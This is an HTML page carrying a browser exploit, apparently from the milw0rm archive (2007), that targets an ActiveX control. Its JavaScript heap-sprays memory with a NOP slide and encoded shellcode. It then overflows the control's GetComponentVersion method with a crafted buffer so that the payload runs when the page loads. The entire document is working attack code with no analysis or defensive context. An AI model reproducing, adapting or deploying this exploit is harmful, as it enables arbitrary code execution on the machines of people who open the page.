<html>
<!--
+++++++++++++++++++++++
+Last Modified by lhoang8500++
+++++++++++++++++++++++
-->
<html>
<object classid="CLSID:7EC7B6C5-25BD-4586-A641-D2ACBB6629DD" id="target"></OBJECT>

<SCRIPT language="javascript">

	var heapSprayToAddress = 0x05050505;

	var payLoadCode = unescape("%uc931%ue983%ud9b0%ud9ee%u2474%u5bf4%u7381%u2713%uf3fc%u830c%ufceb%uf4e2%u96db%u4118%u05cf%uf30c%u9cd8%u6078%ud803%u4978%u771b%u098f%ufd5f%u871c%ue468%u5378%ufd07%u4518%uc8ac%u0d78%ucdc9%u9533%u788b%u7833%u3d20%u0139%u3e26%uf818%ua81c%u24d7%u1952%u5378%ufd03%u6a18%uf0ac%u87b8%ue078%ue7f2%ud024%u8578%ud84b%u6def%ucde4%u6828%ubfac%u87c3%uf067%u7c78%u513b%u4c78%ua22f%u829b%uf269%u5c1f%u2ad8%u5f95%u9441%u3ec0%u8b4f%u3e80%ua878%udc0c%u374f%uf01e%uac1c%uda0c%u7578%u6a16%u11a6%u0efb%u9672%uf3f1%u94f7%u052a%u51d2%uf3a4%uaff1%u5fa0%uaf74%u5fb0%uaf64%udc0c%u9441%u50e2%uaf41%ued7a%u94b2%u1657%u3b57%uf3a4%u96f1%u5de3%u0372%u6423%u5183%ue5dd%u0370%u5f25%u0372%u6423%ub5c2%u4575%u0370%u5c25%ua873%uf3a6%u6ff7%ueb9b%u3a5e%u5b8a%u2ad8%uf3a6%u9af7%u6899%u9441%u6190%u19ae%u5c99%ud57e%u853f%u96c0%u85b7%ucdc5%uff33%u028d%u21b1%ubed9%u9fdf%u86aa%ua7cb%u578c%u7e9b%u4fd9%uf3e5%ub852%uda0c%uab7c%u5da1%uad76%u0d99%uad76%u5da6%u2cd8%ua19b%uf9fe%u5f3d%u2ad8%uf399%ucbd8%udc0c%uabac%u8f0f%u98e3%uda0c%u0375%u6423%u76d7%u53f7%u0374%uf325%ufcf7%u0cf3%u0000");

	var heapBlockSize = 0x400000;

	var payLoadSize = payLoadCode.length * 2;

	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);

	var spraySlide = unescape("%u9090%u9090");
	spraySlide = getSpraySlide(spraySlide,spraySlideSize);

	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;

	memory = new Array();

	for (i=0;i<heapBlocks;i++)
	{
		memory[i] = spraySlide + payLoadCode;
	}
	function getSpraySlide(spraySlide, spraySlideSize)
	{
		while (spraySlide.length*2<spraySlideSize)
		{
			spraySlide += spraySlide;
		}
		spraySlide = spraySlide.substring(0,spraySlideSize/2);
		return spraySlide;
	};
var buffer =  unescape("%u0505");
while (buffer.length < 845)  buffer+='\x0A';
while (buffer.length< 1000) buffer+=unescape("%u0505");

target.GetComponentVersion(buffer);
</script>
</html>

# milw0rm.com [2007-07-31]
